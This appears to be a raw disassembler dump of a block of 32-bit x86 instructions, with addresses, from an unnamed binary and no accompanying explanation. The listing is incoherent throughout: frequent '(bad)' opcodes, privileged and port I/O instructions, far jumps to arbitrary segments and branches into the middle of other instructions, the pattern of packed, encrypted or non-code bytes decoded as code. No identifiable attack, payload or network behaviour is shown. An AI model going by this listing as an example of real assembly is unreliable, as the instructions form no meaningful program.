  412f0d:	adc    bl,dh
  412f0f:	test   DWORD PTR [edi-0x29],esp
  412f12:	out    dx,al
  412f13:	es test al,0x83
  412f16:	(bad)  
  412f18:	jl     0x412f6e
  412f1a:	add    cl,BYTE PTR [esp+edi*4]
  412f1d:	lahf   
  412f1e:	mov    DWORD PTR [esi+0xb137be8],esp
  412f24:	fldenv [edx+ebx*4]
  412f27:	je     0x412f0e
  412f29:	out    dx,al
  412f2a:	rcl    DWORD PTR ds:0xe6039dc0,cl
  412f30:	retf   0x1a4
  412f33:	adc    al,0xc5
  412f35:	fucomp st(2)
  412f37:	mov    ds:0xac709b85,eax
  412f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f3d:	push   ebp
  412f3e:	test   eax,0xe2caea1f
  412f43:	ins    DWORD PTR es:[edi],dx
  412f44:	inc    esp
  412f45:	js     0x412f42
  412f47:	dec    ebx
  412f48:	jnp    0x412f4b
  412f4a:	and    eax,0x296b0889
  412f4f:	(bad)  
  412f50:	jmp    0x412edc
  412f52:	inc    ecx
  412f53:	nop
  412f54:	jae    0x412f65
  412f56:	mov    edi,0xfa5872b2
  412f5b:	fld    TBYTE PTR [esi-0x565af350]
  412f61:	jmp    0x4aa365f7
  412f66:	mov    cl,0x24
  412f68:	loop   0x412f40
  412f6a:	mov    ah,0x62
  412f6c:	das    
  412f6d:	retf   0x2fbe
  412f70:	xchg   esp,eax
  412f71:	sti    
  412f72:	iret   
  412f73:	pop    edi
  412f74:	(bad)  
  412f75:	jmp    0x9281:0x27f5caa4
  412f7c:	retf   0xf87d
  412f7f:	cmp    DWORD PTR [ecx],edx
  412f81:	dec    esp
  412f82:	push   0x3e
  412f84:	sbb    al,BYTE PTR [ebx-0x325613d1]
  412f8a:	imul   edx,DWORD PTR [ebx+0x7155cc04],0xcef42a20
  412f94:	ds dec ecx
  412f96:	pusha  
  412f97:	(bad)  
  412f98:	dec    ebp
  412f99:	retf   0x5b81
  412f9c:	adc    dh,ch
  412f9e:	ss cwde 
  412fa0:	out    dx,al
  412fa1:	xor    al,0x3
  412fa3:	ins    BYTE PTR es:[edi],dx
  412fa4:	and    BYTE PTR [esi-0x1c],al
  412fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fa8:	sub    al,0xcd
  412faa:	xchg   ebp,eax
  412fab:	mov    bh,0xa1
  412fad:	dec    esi
  412fae:	fld    TBYTE PTR [edi]
  412fb0:	ret    0x7136
  412fb3:	inc    ecx
  412fb4:	mov    ch,0xcf
  412fb6:	(bad)  
  412fb8:	cmp    DWORD PTR [edi-0x16b2f9ff],edx
  412fbe:	or     esi,esi
  412fc0:	cdq    
  412fc1:	imul   eax,esi,0x21bbcca5
  412fc7:	jno    0x412f81
  412fc9:	fidiv  DWORD PTR [esi+edx*4-0x1f]
  412fcd:	inc    edi
  412fce:	lea    ebx,[edx+0x3d303137]
  412fd4:	bound  esi,QWORD PTR [edx+0x502f9e1b]
  412fda:	jmp    0xb289:0xa9d1f257
  412fe1:	sbb    DWORD PTR [edi-0x4b91c78d],edx
  412fe7:	add    ch,BYTE PTR [eax+0x534946b]
  412fed:	xchg   BYTE PTR [ebx-0x2c9f1674],ah
  412ff3:	in     eax,0x6b
  412ff5:	cmp    edx,DWORD PTR [ecx]
  412ff7:	dec    ebp
  412ff8:	fcom   QWORD PTR [ebx]
  412ffa:	imul   DWORD PTR [ecx+0x3245760d]
  413000:	adc    BYTE PTR [edi],ah
  413002:	xor    al,0x8f
  413004:	leave  
  413005:	xchg   ecx,eax
  413006:	dec    eax
  413007:	inc    eax
  413008:	jg     0x413039
  41300a:	xor    al,0xab
  41300c:	aam    0x6a
  41300e:	pop    WORD PTR [ebx]
  413011:	sbb    al,0x46
  413013:	fs mov esi,ds
  413016:	mov    ebp,0xab20e1a9
  41301b:	pop    esp
  41301c:	mov    eax,0x27dd54f7
  413021:	mov    bh,0xe7
  413023:	enter  0xcd44,0x60
  413027:	repz retf 
  413029:	or     DWORD PTR [eax+0x31],esp
  41302c:	out    dx,eax
  41302d:	loope  0x413049
  41302f:	push   0x79d0f250
  413034:	pop    esp
  413035:	or     ebx,DWORD PTR [eax+0x7d]
  413038:	fwait
  413039:	cwde   
  41303a:	add    al,0x2
  41303c:	in     al,0x4c
  41303e:	mov    al,0x79
  413040:	pop    ds
  413041:	push   ss
  413042:	mov    esi,0x37d1fc72
  413047:	jl     0x41302d
  413049:	in     eax,dx
  41304a:	mov    ch,0xf8
  41304c:	adc    eax,0xef776dfb
  413051:	push   cs
  413052:	sti    
  413053:	or     eax,0xc489f776
  413058:	adc    DWORD PTR [ebx],0x42
  41305b:	stos   WORD PTR es:[edi],ax
  41305d:	xchg   DWORD PTR ds:0xf640a515,esi
  413063:	pop    edx
  413064:	sahf   
  413065:	ror    DWORD PTR [ecx+0x30],1
  413068:	(bad)  
  413069:	adc    ch,al
  41306b:	mov    ecx,ds
  41306d:	add    BYTE PTR [edi-0x3],bl
  413070:	pop    esp
  413071:	sub    BYTE PTR ds:0xa12c1f9c,0xa8
  413079:	and    eax,0x8044dc69
  41307e:	out    0x96,eax
  413080:	mov    ebp,0x61f6b102
  413085:	idiv   DWORD PTR [esi+0x5938c93]
  41308b:	outs   dx,DWORD PTR ds:[esi]
  41308c:	pop    ebx
  41308d:	jae    0x4130b9
  41308f:	lahf   
  413090:	pop    ecx
  413091:	mov    ebx,0x7c17472f
  413096:	push   ds
  413097:	mov    DWORD PTR [eax+0x3bee4aaf],esp
  41309d:	mov    ds:0xf4fdc794,eax
  4130a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130a3:	mov    ah,0xc4
  4130a5:	popf   
  4130a6:	inc    ebx
  4130a7:	inc    ebx
  4130a8:	icebp  
  4130a9:	(bad)  
  4130aa:	das    
  4130ab:	bnd ja 0x41306f
  4130ae:	into   
  4130af:	fsub   DWORD PTR [ebx+0x6a6a83e2]
  4130b5:	mov    dl,0x69
  4130b7:	(bad)  
  4130b8:	jg     0x413061
  4130ba:	and    eax,0x10ac7241
  4130bf:	neg    BYTE PTR [esi]
  4130c1:	lds    esp,FWORD PTR [edi]
  4130c3:	add    ebp,DWORD PTR [ebx+0x4c]
  4130c6:	stc    
  4130c7:	sub    edx,ecx
  4130c9:	xor    BYTE PTR [edi],ch
  4130cb:	clc    
  4130cc:	test   DWORD PTR [edi+0x33],esp
  4130cf:	out    dx,eax
  4130d0:	loope  0x413096
  4130d2:	add    esp,ebx
  4130d4:	push   edx
  4130d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d6:	xor    eax,0x402c9c37
  4130db:	pop    ebx
  4130dc:	lock test DWORD PTR [ebp+0x7a],esi
  4130e0:	jae    0x4130b1
  4130e2:	pop    edx
  4130e3:	mov    ch,BYTE PTR [ebx]
  4130e5:	jns    0x413091
  4130e7:	cdq    
  4130e8:	jo     0x413164
  4130ea:	adc    cl,BYTE PTR [ebp+0x22]
  4130ed:	push   eax
  4130ee:	rol    BYTE PTR [ecx],0xde
  4130f1:	fwait
  4130f2:	cmp    cl,BYTE PTR [esp+eiz*4-0x75823b41]
  4130f9:	or     edi,DWORD PTR [edi+0x73]
  4130fc:	pop    edi
  4130fd:	ja     0x4130ec
  4130ff:	nop
  413100:	scas   al,BYTE PTR es:[edi]
  413101:	pandn  mm6,QWORD PTR [ebx+0x6c]
  413105:	dec    esi
  413106:	dec    esi
  413107:	or     al,0xcc
  413109:	std    
  41310a:	ss jmp 0x413104
  41310d:	dec    ebx
  41310e:	scas   al,BYTE PTR es:[edi]
  41310f:	ret    
  413110:	adc    eax,0xcc8f8bd9
  413115:	lea    edx,[esi]
  413117:	add    eax,0x6af132f5
  41311c:	push   eax
  41311d:	mov    edx,0xfab80e74
  413122:	jne    0x4130c9
  413124:	pop    ebp
  413125:	mov    al,0x28
  413127:	or     eax,0x5bc5defd
  41312c:	add    DWORD PTR [edi+0x50d95dd],0x2d
  413133:	mov    eax,0x306226d4
  413138:	add    ecx,edi
  41313a:	jmp    0x4543:0x4f960294
  413141:	out    0xd6,al
  413143:	ror    DWORD PTR [edi-0x3d],1
  413146:	ja     0x41314e
  413148:	mov    esp,0x53d7f0ff
  41314d:	hlt    
  41314e:	mov    ?,WORD PTR [esi+ecx*4]
  413151:	xchg   ebp,eax
  413152:	sbb    bl,BYTE PTR [esi+esi*1]
  413155:	shr    DWORD PTR ds:0xf4210fd4,cl
  41315b:	js     0x4131c2
  41315d:	jo     0x413158
  41315f:	xchg   DWORD PTR [edx-0xfd93f2c],edx
  413165:	dec    ebx
  413166:	cmp    BYTE PTR [ecx-0x61fe3692],ah
  41316c:	jmp    0x413155
  41316e:	mov    bl,0xdc
  413170:	mov    esp,0x3704b16d
  413175:	nop
  413176:	pop    esp
  413177:	cmp    dh,ah
  413179:	test   BYTE PTR [eax],ch
  41317b:	fistp  WORD PTR [esi]
  41317d:	and    eax,0x24c25dde
  413182:	das    
  413183:	adc    al,0x69
  413185:	mov    DWORD PTR [ebx],edx
  413187:	sub    eax,0xaa48ab2b
  41318c:	je     0x413187
  41318e:	stos   DWORD PTR es:[edi],eax
  41318f:	mov    ah,0xc6
  413191:	mov    bl,0x48
  413193:	lahf   
  413194:	add    bh,BYTE PTR [edx]
  413196:	mov    DWORD PTR [ebx-0x55],ecx
  413199:	push   ecx
  41319a:	mov    dl,0x9e
  41319c:	xor    ch,BYTE PTR [edx]
  41319e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41319f:	aad    0x74
  4131a1:	arpl   cx,bp
  4131a3:	xor    ecx,eax
  4131a5:	inc    BYTE PTR [ecx-0x2ad55825]
  4131ab:	enter  0xed8a,0x86
  4131af:	test   eax,0x744cdf41
  4131b4:	xor    BYTE PTR [edx],bh
  4131b6:	loop   0x4131b3
  4131b8:	stos   BYTE PTR es:[edi],al
  4131b9:	mov    ds:0x8eecb417,al
  4131be:	jo     0x413181
  4131c0:	xor    DWORD PTR [edx+0x39],esi
  4131c3:	daa    
  4131c4:	loope  0x413179
  4131c6:	push   es
  4131c7:	and    esp,DWORD PTR [edi+0x78fe5427]
  4131cd:	inc    ebp
  4131ce:	push   eax
  4131cf:	lahf   
  4131d0:	retf   
  4131d1:	push   ecx
  4131d2:	xchg   edi,eax
  4131d3:	outs   dx,BYTE PTR ds:[esi]
  4131d4:	call   0xc3c8ceca
  4131d9:	inc    edx
  4131da:	inc    ebx
  4131db:	or     al,0x9e
  4131dd:	mov    eax,ds:0x3ae41b6
  4131e2:	mov    bl,0x32
  4131e4:	or     eax,DWORD PTR [eax-0x79]
  4131e7:	sub    al,0x84
  4131e9:	pop    ds
  4131ea:	ja     0x41324e
  4131ec:	repz or bl,0xb5
  4131f0:	aas    
  4131f1:	aas    
  4131f2:	data16 not BYTE PTR fs:[ecx-0x13414a00]
  4131fa:	pop    eax
  4131fb:	iret   
  4131fc:	mov    eax,ds:0xb573b5d9
  413201:	dec    edi
  413202:	fisubr WORD PTR [edx-0x7e]
  413205:	repnz loop 0x413195
  413208:	sub    bh,BYTE PTR [edi-0x55b1b2d9]
  41320e:	dec    eax
  41320f:	mov    esi,0x2b580a81
  413214:	add    ebp,0x79dd3d1a
  41321a:	cwde   
  41321b:	je     0x4131af
  41321d:	push   esp
  41321e:	sbb    eax,0xc58c3cc2
  413223:	adc    BYTE PTR [ebx*4-0x2bc6a6c1],ah
  41322a:	jb     0x413230
  41322c:	shl    BYTE PTR [ebx+ebx*1],cl
  41322f:	jb     0x413258
  413231:	inc    esp
  413232:	not    BYTE PTR [edx+0x2b]
  413235:	inc    edi
  413236:	sub    DWORD PTR [edi],edi
  413238:	inc    ecx
  413239:	inc    edi
  41323a:	fldl2e 
  41323c:	pusha  
  41323d:	cmc    
  41323e:	xchg   ebp,eax
  41323f:	into   
  413240:	in     al,0xa0
  413242:	push   ebp
  413243:	test   esp,ebp
  413245:	add    edx,DWORD PTR [eax]
  413247:	or     ebp,DWORD PTR [esi-0x3e0fdedf]
  41324d:	cmp    eax,0xf4400c32
  413252:	retf   
  413253:	pop    eax
  413254:	(bad)  
  413255:	push   eax
  413256:	ds int3 
  413258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413259:	pop    esp
  41325a:	clc    
  41325b:	int3   
  41325c:	jb     0x413279
  41325e:	fist   DWORD PTR [ecx+ebp*4+0x50]
  413262:	stos   DWORD PTR es:[edi],eax
  413263:	sub    BYTE PTR [eax+0x320b5ea9],bl
  413269:	mov    dh,0xc8
  41326b:	cdq    
  41326c:	jmp    0x413226
  41326e:	scas   eax,DWORD PTR es:[edi]
  41326f:	adc    eax,DWORD PTR [eax-0x803eca4]
  413275:	push   0x13
  413277:	fnstenv [ebx+0x6e814a85]
  41327d:	test   DWORD PTR [eax],ebp
  41327f:	sub    DWORD PTR [ecx+eiz*4+0x32c55da4],ecx
  413286:	sti    
  413287:	mov    eax,ds:0xfcf2eac3
  41328c:	xchg   ebp,eax
  41328d:	addr16 sub ch,dh
  413290:	and    eax,0x7f1c5c5b
  413295:	and    dh,BYTE PTR [ecx+0x3f70dbf5]
  41329b:	es push es
  41329d:	xor    al,0xab
  41329f:	pop    ds
  4132a0:	mov    esi,0xabe6107
  4132a5:	mov    dh,0xfe
  4132a7:	jecxz  0x4132c8
  4132a9:	pop    eax
  4132aa:	ror    BYTE PTR ds:0x9b8a414d,0x51
  4132b1:	adc    eax,0xff465de2
  4132b6:	gs mov edx,0x26adfcab
  4132bc:	mov    eax,ds:0x6c66df6c
  4132c1:	sbb    ecx,DWORD PTR [ebx+0x4249abbf]
  4132c7:	mov    fs,WORD PTR [edi+eiz*4+0x42af7356]
  4132ce:	sbb    al,0xf2
  4132d0:	adc    al,BYTE PTR [esi+eax*1]
  4132d3:	mov    ecx,0x1afe2e12
  4132d8:	jbe    0x413291
  4132da:	retf   0x30
  4132dd:	push   edi
  4132de:	inc    ebp
  4132df:	daa    
  4132e0:	jns    0x4132ac
  4132e2:	fwait
  4132e3:	pop    ebx
  4132e4:	pusha  
  4132e5:	pop    ebp
  4132e6:	sbb    ebp,DWORD PTR [ecx+0x78]
  4132e9:	leave  
  4132ea:	enter  0x2780,0xad
  4132ee:	and    BYTE PTR [eax-0x20],bh
  4132f1:	(bad)  
  4132f2:	ss mov ebp,cr0
  4132f6:	jne    0x413339
  4132f8:	xchg   ebp,eax
  4132f9:	in     al,dx
  4132fa:	dec    eax
  4132fb:	(bad)  
  4132fd:	xchg   edx,eax
  4132fe:	and    BYTE PTR [ebx+0x54ac85a8],dh
  413304:	or     al,0x1d
  413306:	repnz mov eax,ds:0x7a0bc121
  41330c:	clc    
  41330d:	sub    al,0x7c
  41330f:	xor    DWORD PTR [esi+0x559bd5c2],0x2eda8794
  413319:	sub    eax,0xc256f2ae
  41331e:	sbb    al,0xa9
  413320:	xor    dh,ah
  413322:	ss cmp edx,edi
  413325:	adc    edi,DWORD PTR [edi-0x37767d84]
  41332b:	pop    eax
  41332c:	rcl    BYTE PTR [ecx+ebx*1+0x294b58d0],cl
  413333:	stos   BYTE PTR es:[edi],al
  413334:	mov    ds:0x63e5945a,al
  413339:	fwait
  41333a:	add    BYTE PTR cs:[edi],0x4d
  41333e:	lahf   
  41333f:	stos   DWORD PTR es:[edi],eax
  413340:	push   eax
  413341:	pop    eax
  413342:	out    dx,al
  413343:	into   
  413344:	outs   dx,BYTE PTR ds:[esi]
  413345:	sub    edi,DWORD PTR [ebx]
  413347:	lea    edi,[ebx-0x35]
  41334a:	xlat   BYTE PTR ds:[ebx]
  41334b:	dec    ebx
  41334c:	cmp    eax,0x4e6ce1af
  413351:	add    eax,DWORD PTR [ecx+0xb3ed00d]
  413357:	je     0x4133c1
  413359:	loope  0x41339b
  41335b:	outs   dx,BYTE PTR ds:[esi]
  41335c:	dec    esp
  41335d:	or     DWORD PTR es:[edx-0x2e],eax
  413361:	lock gs xchg edx,eax
  413364:	test   al,0xe6
  413366:	sti    
  413367:	lea    edi,es:[esi-0x55]
  41336b:	cmp    BYTE PTR [eax+0x73],ah
  41336e:	inc    esi
  41336f:	lds    eax,FWORD PTR [eax+0x5b208dd2]
  413375:	cwde   
  413376:	sub    DWORD PTR [ecx+esi*2-0x16b61ef],esp
  41337d:	mov    edi,DWORD PTR [eax+0x65]
  413380:	pop    ecx
  413381:	add    ch,BYTE PTR ds:0x2fcd3df7
  413387:	push   esp
  413388:	fild   WORD PTR [edx-0x66b95814]
  41338e:	ins    BYTE PTR es:[edi],dx
  41338f:	in     eax,0xd4
  413391:	dec    edx
  413392:	mov    eax,0xd88bcac0
  413397:	xor    DWORD PTR [ecx],esi
  413399:	(bad)  
  41339a:	pop    eax
  41339b:	pop    ebx
  41339c:	into   
  41339d:	loopne 0x413409
  41339f:	push   edi
  4133a0:	fnsave [ebx-0x31068e0d]
  4133a6:	ja     0x413368
  4133a8:	adc    dh,BYTE PTR [edi-0x25085c5c]
  4133ae:	inc    esi
  4133af:	sbb    al,0xf1
  4133b1:	mov    BYTE PTR [edi+0x45],ah
  4133b4:	xor    dh,BYTE PTR [ebp+0x4e]
  4133b7:	daa    
  4133b8:	hlt    
  4133b9:	int    0xb0
  4133bb:	in     eax,0x84
  4133bd:	pop    ebp
  4133be:	and    ecx,DWORD PTR [esp+edi*2]
  4133c1:	es jle 0x413422
  4133c4:	cmp    dh,ah
  4133c6:	xchg   edi,eax
  4133c7:	lock pushf 
  4133c9:	bound  esp,QWORD PTR ds:0xd3cd41e
  4133cf:	rcl    DWORD PTR [esp+ecx*2],0x9e
  4133d3:	ja     0x41340f
  4133d5:	cmc    
  4133d6:	dec    edx
  4133d7:	mov    edi,0x4187f8c9
  4133dc:	pusha  
  4133dd:	std    
  4133de:	cmp    eax,DWORD PTR [edi-0x2467cb95]
  4133e4:	das    
  4133e5:	sub    al,0x8
  4133e7:	mov    cl,0x98
  4133e9:	test   DWORD PTR [edi+ecx*8-0x494e8eea],ebx
  4133f0:	jnp    0x4133db
  4133f2:	in     eax,dx
  4133f3:	pop    eax
  4133f5:	fldcw  WORD PTR [esi+0x7c]
  4133f8:	and    DWORD PTR [esi+0x1],esp
  4133fb:	and    al,0xb6
  4133fd:	pmuludq mm7,mm7
  413400:	jmp    0x4133d3
  413402:	add    DWORD PTR [ebp-0x57d48c7d],edi
  413408:	mov    ds:0x5edb9e4c,eax
  41340d:	xor    eax,DWORD PTR [ebp-0x6a]
  413410:	inc    edi
  413411:	lods   al,BYTE PTR ds:[esi]
  413412:	mov    edi,0x46bae0e9
  413417:	add    al,0x5c
  413419:	shr    DWORD PTR [edx],cl
  41341b:	push   ss
  41341c:	nop
  41341d:	sahf   
  41341e:	mov    al,0xf6
  413420:	jne    0x41340f
  413422:	dec    eax
  413423:	jmp    0xdbf4ac53
  413428:	sub    cl,BYTE PTR [ebx+0x79]
  41342b:	mov    eax,0xea5e907
  413430:	out    dx,eax
  413431:	stc    
  413432:	je     0x4133c1
  413434:	sub    al,0xb7
  413436:	outs   dx,BYTE PTR ds:[esi]
  413437:	adc    dh,ah
  413439:	pop    edi
  41343a:	ss add al,0x1d
  41343d:	lock cwde 
  41343f:	adc    al,0xaa
  413441:	push   edx
  413442:	mov    ebp,0x1ba77cf2
  413447:	movd   esi,mm6
  41344a:	mov    ds:0xf19547aa,eax
  41344f:	push   edi
  413450:	data16 xchg BYTE PTR [edi+0x6],al
  413454:	pop    ebx
  413455:	cdq    
  413456:	in     al,dx
  413457:	bound  ecx,QWORD PTR [ebp+0x4679f770]
  41345d:	icebp  
  41345e:	push   0xffffffb8
  413460:	rcr    DWORD PTR [edi+0x7b91a9d2],cl
  413466:	mov    ds:0x3f46a64b,eax
  41346b:	xor    BYTE PTR [esi+eax*8],cl
  41346e:	mov    edi,0x357e09c1
  413473:	icebp  
  413474:	mov    eax,ds:0xe6979eea
  413479:	sub    BYTE PTR [edx],bh
  41347b:	push   ds
  41347c:	(bad)  
  41347e:	loope  0x413415
  413480:	add    dh,cl
  413482:	(bad)  
  413483:	mov    esp,0x5d4f3c00
  413488:	fs dec ecx
  41348a:	imul   edi,DWORD PTR [ebx],0xabda1bdc
  413490:	sahf   
  413491:	out    dx,al
  413492:	cmp    ah,BYTE PTR [ecx-0xe]
  413495:	inc    ebx
  413496:	std    
  413497:	stos   DWORD PTR es:[edi],eax
  413498:	ret    
  413499:	mov    dl,0xa9
  41349b:	sub    al,0x41
  41349d:	push   ds
  41349e:	sub    eax,0x69364be5
  4134a3:	iret   
  4134a4:	push   es
  4134a5:	cmp    ch,BYTE PTR [eax+0x29]
  4134a8:	dec    esp
  4134a9:	imul   BYTE PTR [eax+ebp*8-0x5bdf3914]
  4134b0:	icebp  
  4134b1:	add    eax,0xf98de023
  4134b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b7:	rcr    BYTE PTR [edx+ebp*1-0x4b],cl
  4134bb:	mov    eax,ds:0x1c0bc096
  4134c0:	xchg   edx,eax
  4134c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134c2:	jb     0x413457
  4134c4:	push   eax
  4134c5:	std    
  4134c6:	arpl   sp,dx
  4134c8:	push   esp
  4134c9:	fwait
  4134ca:	add    BYTE PTR [esi+0x717d1822],ah
  4134d0:	jo     0x413510
  4134d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134d3:	push   edi
  4134d4:	lahf   
  4134d5:	inc    edi
  4134d6:	jl     0x4134e2
  4134d8:	and    DWORD PTR [esi+edi*1+0x35],edx
  4134dc:	xor    ebp,DWORD PTR [edx]
  4134de:	inc    esi
  4134df:	(bad)  
  4134e0:	push   cs
  4134e1:	aad    0x66
  4134e3:	and    BYTE PTR [eax*8+0x6dedf00b],0xdf
  4134eb:	push   cs
  4134ec:	dec    edx
  4134ed:	sbb    eax,0x981b0d6b
  4134f2:	mov    ecx,0xe53afc94
  4134f7:	cmp    al,0x63
  4134f9:	rcl    DWORD PTR [edx-0x59],1
  4134fc:	cli    
  4134fd:	mov    bh,0x9b
  4134ff:	daa    
  413500:	xchg   ebx,eax
  413502:	stos   BYTE PTR es:[edi],al
  413503:	shl    BYTE PTR [ecx],cl
  413505:	(bad)  
  413506:	sbb    edi,DWORD PTR [esi+0x49]
  413509:	ficom  DWORD PTR [eax]
  41350b:	inc    DWORD PTR [ebp+0x4d67795b]
  413511:	or     eax,0x17582c8b
  413516:	pop    eax
  413517:	sub    edx,DWORD PTR [ebp+eiz*1+0x53]
  41351b:	and    al,0x24
  41351d:	sub    ch,BYTE PTR [eax+edx*8]
  413520:	xchg   BYTE PTR [edx],bh
  413522:	out    dx,al
  413523:	xchg   eax,edx
  413525:	imul   esp,ebx,0xffffffb5
  413528:	test   eax,esi
  41352a:	je     0x413513
  41352c:	imul   eax,DWORD PTR [ebx],0xffffffdf
  41352f:	mov    bl,0x2d
  413531:	and    BYTE PTR [ebx+0x79],bh
  413534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413535:	sub    eax,0x45964317
  41353a:	inc    ecx
  41353b:	jo     0x413572
  41353d:	xor    BYTE PTR [eax+0x77],bl
  413540:	dec    eax
  413541:	(bad)  
  413543:	or     ecx,DWORD PTR [edi+0x340318a3]
  413549:	pop    ebx
  41354a:	mov    ah,0x91
  41354c:	xor    eax,0xc7241c2c
  413551:	fldcw  WORD PTR ds:0x3de3ffe8
  413557:	(bad)
  41355a:	cmp    esp,DWORD PTR [edx*8-0x1dd85217]
  413561:	imul   esi,DWORD PTR ds:0x56ee5561,0x5b
  413568:	dec    BYTE PTR [ebp+0x73e5b335]
  41356e:	jl     0x413565
  413570:	cmp    al,0x8d
  413573:	sbb    DWORD PTR [ecx+eiz*8-0x79],ebx
  413577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413578:	or     DWORD PTR [eax+0x3a],ecx
  41357b:	(bad)  
  41357c:	int3   
  41357d:	jl     0x413580
  41357f:	pushf  
  413580:	aaa    
  413581:	jge    0x4135d8
  413583:	stos   DWORD PTR es:[edi],eax
  413584:	mov    bh,0x13
  413586:	xlat   BYTE PTR ds:[ebx]
  413587:	fist   WORD PTR [esp+ecx*8]
  41358a:	(bad)  
  41358b:	in     eax,dx
  41358c:	inc    esp
  41358d:	retf   0xf9eb
  413590:	iret   
  413591:	xor    DWORD PTR [edi+0x3a],esp
  413594:	lods   al,BYTE PTR ds:[esi]
  413595:	out    0x8d,al
  413597:	mov    eax,DWORD PTR [eax-0x2059f97e]
  41359d:	cmp    al,0xd0
  41359f:	popf   
  4135a0:	arpl   di,dx
  4135a2:	fistp  WORD PTR [edx-0x47eaf74f]
  4135a8:	push   esp
  4135a9:	clc    
  4135aa:	fwait
  4135ab:	push   ecx
  4135ac:	cmp    DWORD PTR [ecx-0x36701d01],0xffffffbd
  4135b3:	adc    eax,0xc8e6e7a0
  4135b8:	xor    DWORD PTR [esi-0x58],eax
  4135bb:	or     BYTE PTR [ebx-0x2d],cl
  4135be:	mov    cl,0xe1
  4135c0:	and    eax,0xf9bbd50e
  4135c5:	into   
  4135c6:	test   DWORD PTR [ecx],edi
  4135c8:	cld    
  4135c9:	sub    eax,0xfd229788
  4135ce:	stc    
  4135cf:	add    esp,ecx
  4135d1:	mov    edx,0x3d6122a9
  4135d6:	in     eax,dx
  4135d7:	retf   
  4135d8:	jp     0x413591
  4135da:	sub    eax,0x87e40d8f
  4135df:	adc    edx,DWORD PTR ds:0x4cec8f7e
  4135e5:	and    eax,0x5ac92bca
  4135ea:	leave  
  4135eb:	call   0x6278:0xcf07a721
  4135f2:	pop    ss
  4135f3:	fs add al,0xa8
  4135f6:	(bad)  [eax]
  4135f8:	sub    BYTE PTR gs:[esi+0x68],dh
  4135fc:	in     eax,0x10
  4135fe:	push   ecx
  4135ff:	lea    esi,[edi-0x1f]
  413602:	jns    0x4135f9
  413604:	out    dx,al
  413605:	push   es
  413606:	adc    bl,ch
  413608:	push   edi
  413609:	mov    edi,0xd8a8f08d
  41360e:	sub    eax,0x166fb0ad
  413613:	or     ebx,DWORD PTR [ecx-0x64e396fc]
  413619:	sbb    ebp,ebx
  41361b:	xchg   BYTE PTR [ebx+0x6fa6ef04],ah
  413621:	out    0x5a,eax
  413623:	cmp    DWORD PTR [ebp+0x5d63ad32],edi
  413629:	stos   BYTE PTR es:[edi],al
  41362a:	push   edx
  41362b:	cmp    eax,0xdbc5d71f
  413630:	adc    BYTE PTR [ebp*4-0x7f4feb55],al
  413637:	and    esi,DWORD PTR [ebp-0x66b7dcf1]
  41363d:	clc    
  41363e:	sysret 
  413640:	jae    0x413622
  413642:	pop    es
  413643:	inc    ebx
  413644:	inc    ebp
  413645:	fdiv   QWORD PTR [edx-0x5ebea690]
  41364b:	jp     0x413634
  41364d:	js     0x4135ff
  41364f:	mov    dh,0x8f
  413651:	xchg   ebp,eax
  413652:	inc    esp
  413653:	mov    bh,0x6a
  413655:	setns  BYTE PTR [eax-0x3f]
  413659:	inc    ecx
  41365a:	jo     0x41368a
  41365c:	(bad)  
  41365d:	aam    0x6
  41365f:	int3   
  413660:	sub    ch,BYTE PTR [esi-0x13]
  413663:	std    
  413664:	add    al,0xef
  413666:	ins    DWORD PTR es:[edi],dx
  413667:	mov    WORD PTR [ebp+0x4b73f033],ss
  41366d:	das    
  41366e:	pushf  
  41366f:	jne    0x413601
  413671:	fstp   DWORD PTR [edi]
  413673:	ror    DWORD PTR [ebx],0xf2
  413676:	jecxz  0x413636
  413678:	adc    al,0xce
  41367a:	inc    esi
  41367b:	mov    BYTE PTR [edi+0x22],bh
  41367e:	(bad)  
  41367f:	int3   
  413680:	mov    ebp,cr5
  413683:	lods   al,BYTE PTR ds:[esi]
  413684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413685:	popw   es
  413687:	ss (bad) 
  413689:	psllq  mm7,QWORD PTR [ebx-0x6e]
  41368d:	inc    esi
  41368e:	arpl   WORD PTR [esi-0x20525e11],dx
  413694:	mov    al,0x19
  413696:	enter  0x7655,0xbf
  41369a:	aaa    
  41369b:	lahf   
  41369c:	push   es
  41369d:	jne    0x4136b2
  41369f:	jbe    0x4136a6
  4136a1:	fs scas al,BYTE PTR es:[edi]
  4136a3:	jne    0x41369b
  4136a5:	in     eax,0x83
  4136a7:	iret   
  4136a8:	add    eax,0xaac3b25d
  4136ad:	inc    esi
  4136ae:	inc    edi
  4136af:	mov    esi,0xa5fb1659
  4136b4:	aad    0x2e
  4136b6:	jle    0x4136d4
  4136b8:	clc    
  4136b9:	inc    ecx
  4136ba:	sub    eax,0xa4e0edf0
  4136bf:	(bad)  
  4136c0:	sti    
  4136c1:	sub    edx,ebp
  4136c3:	loope  0x413699
  4136c5:	sub    al,0xd6
  4136c7:	mov    edx,0x23178e1c
  4136cc:	xlat   BYTE PTR ds:[ebx]
  4136cd:	sahf   
  4136ce:	inc    edi
  4136cf:	push   ebp
  4136d0:	mov    ebx,0xe52efff0
  4136d5:	pop    ebx
  4136d6:	jmp    FWORD PTR [ecx+0x5]
  4136d9:	xchg   edx,eax
  4136da:	cld    
  4136db:	stos   DWORD PTR es:[edi],eax
  4136dc:	mov    dl,0x6a
  4136de:	out    dx,eax
  4136df:	and    eax,0xec8c3ced
  4136e4:	lock imul edx,edi,0x87d9e98
  4136eb:	sar    bh,cl
  4136ed:	xchg   edx,eax
  4136ee:	pop    ds
  4136ef:	mov    esi,0xa2bb2c16
  4136f4:	and    BYTE PTR [eax],dl
  4136f6:	scas   al,BYTE PTR es:[edi]
  4136f7:	sahf   
  4136f8:	out    dx,eax
  4136f9:	sub    DWORD PTR [edx-0x17552127],0xc2567671
  413703:	popf   
  413704:	cli    
  413705:	sub    dl,BYTE PTR [esi+0x3582520d]
